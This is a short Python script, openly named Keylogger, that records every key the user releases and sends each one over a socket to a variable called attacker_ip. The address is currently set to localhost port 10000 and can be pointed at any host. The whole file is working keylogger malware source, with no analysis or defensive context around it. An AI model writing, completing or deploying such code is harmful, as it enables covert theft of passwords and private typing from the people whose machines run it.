import keyboard
import socket

class Keylogger(object):
    def __init__(self):
        self.attacker_ip = '127.0.0.1'
        self.attacker_port = 10000
        self.socket = socket.socket()
        self.socket.connect((self.attacker_ip, self.attacker_port))
    
    def start_recording(self):
        keyboard.on_release(callback=self.callback)
        keyboard.wait()
    
    def callback(self, event):
        key = event.name
        self.send_to_attacker(str(key))

    def send_to_attacker(self, keystroke):
        self.socket.send(keystroke.encode())

keylogger = Keylogger()
keylogger.start_recording()